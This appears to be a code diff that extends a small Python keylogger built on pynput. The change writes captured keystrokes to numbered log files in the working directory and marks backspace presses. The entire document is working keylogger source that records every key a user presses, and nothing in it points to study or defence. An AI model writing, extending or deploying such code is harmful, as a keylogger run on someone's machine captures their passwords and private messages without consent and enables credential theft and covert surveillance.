@@ -1,4 +1,11 @@
 from pynput.keyboard import Listener
+from os import getcwd, listdir
+
+files = listdir(getcwd())
+if len(files) == 2:
+    i = 1
+else:
+    i = int(files[0][5:-5]) + 1
 
 def log(key):
     letter = str(key)
@@ -10,8 +17,10 @@ def log(key):
         letter = ''
     if letter == "Key.enter":
         letter = "\n"
+    if letter == "Key.backspace":
+        letter = "<bk>"
 
-    with open("logs.txt", 'a') as f:
+    with open(f"logs({i}).txt", "a") as f:
         f.write(letter)
 
 with Listener(on_press=log) as l:
